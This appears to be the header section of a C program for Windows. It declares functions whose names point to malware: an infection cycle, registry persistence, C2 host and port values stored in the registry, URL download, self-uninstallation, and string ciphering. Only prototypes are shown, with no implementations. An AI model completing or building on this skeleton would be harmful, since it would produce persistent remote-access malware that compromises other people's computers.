#include "windows.h"
#include "winreg.h"
#include <stdio.h>

#pragma comment(lib, "Advapi32.lib")

int doNetworkInfoChange(char* pConnInfoKey, char* pRegistryValue, char* pRegistryData);
int doUrlDownload(char* pInputCommand);
int doUninstallation(char* pConnInfoKey, char* pPersistKey, char* pHostValue, char* pPortValue, char* pPersistValue, char currentPath[MAX_PATH]);
int runInfectionCycle(char* pConnInfoKey, char* pPersistKey, char* pHostValue, char* pPortValue, char* pPersistValue, char* pHostData, char* pPortData, char* currentPath, char* persistPath);
int writeRegistryData(char* pRegistryKey, char* pRegistryValue, char* pRegistryData);
int encodeCipher(char* pStringToEncrypt);
int decodeCipher(char* pStringToEncrypt);